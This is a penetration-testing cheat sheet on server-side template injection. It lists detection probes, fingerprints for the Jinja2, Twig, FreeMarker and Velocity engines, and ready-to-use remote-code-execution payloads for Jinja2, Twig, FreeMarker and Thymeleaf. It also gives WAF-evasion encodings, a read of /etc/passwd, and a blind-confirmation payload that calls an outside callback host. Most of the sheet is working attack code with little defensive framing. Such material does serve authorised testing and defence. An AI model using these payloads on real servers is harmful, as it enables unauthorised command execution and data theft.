# SSTI: Server-Side Template Injection

## Detection & Fingerprinting

### Universal Probe
```
${{<%[%'"}}%```

### Arithmetic Confirmation
| Expression | Expected if evaluated |
|-----------|----------------------|
| `{{7*7}}` | `49` (Jinja2, Twig) |
| `${7*7}` | `49` (FreeMarker, Velocity) |
| `#{7*7}` | `49` (Thymeleaf) |
| `{{7*'7'}}` | `7777777` (Jinja2) vs `49` (Twig) |

This test distinguishes Jinja2 (Python string repetition) from Twig (PHP type coercion).

### Engine-Specific Fingerprinting
```bash
# Send payloads that produce unique error messages per engine
# Jinja2: jinja2.exceptions.UndefinedError
# Twig: Twig\Error\SyntaxError
# FreeMarker: freemarker.core.ParseException
# Velocity: org.apache.velocity.exception.ParseErrorException
```

## Exploitation Chains

### Jinja2 → RCE
```python
# Classic MRO traversal
{{ ''.__class__.__mro__[1].__subclasses__() }}
# Find subprocess.Popen index
{{ ''.__class__.__mro__[1].__subclasses__()[X]('id', shell=True, stdout=-1).communicate() }}
# Bypassing underscore filters with |attr()
{{ ''|attr('__cla'+'ss__')|attr('__mr'+'o__') }}
# Using Flask globals (lipsum/cycler) when __ is blocked
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

### Twig → RCE
```php
{{ ['id']|filter('system') }}
{{ ['id']|map('system') }}
// Twig 2.x sandbox bypass via undefined filter callback
{{ '/etc/passwd'|file_get_contents }}
```

### FreeMarker → RCE (Java)
```java
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
// When Execute is blocked
<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>
${ ob("java.lang.ProcessBuilder","id").start() }
```

### Thymeleaf → RCE (Spring Boot)
```
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).useDelimiter("\A").next()}__::.x
```

## WAF Bypass for SSTI

```bash
# String concatenation
{{''|attr("__cla"+"ss__")}}
# Hex encoding underscores
{{''|attr("\x5f\x5fclass\x5f\x5f")}}
# URL encoding
%7B%7B''.__class__.__mro__%7D%7D
# Newline in payload (breaks WAF single-line rules)
{{''.__class__
.__mro__}}
```

## Blind SSTI Confirmation

```python
# Time-based (Jinja2)
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('time').sleep(5) }}
# OOB (DNS/HTTP callback)
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('urllib.request').urlopen('http://collaborator.oastify.com/') }}
```

## Common SSTI Surfaces

- Email notification templates (user-customizable subjects/bodies)
- PDF report generators with template-based formatting
- Error pages that render user input
- Profile fields displayed through template engines
- CMS template editing (admin features)
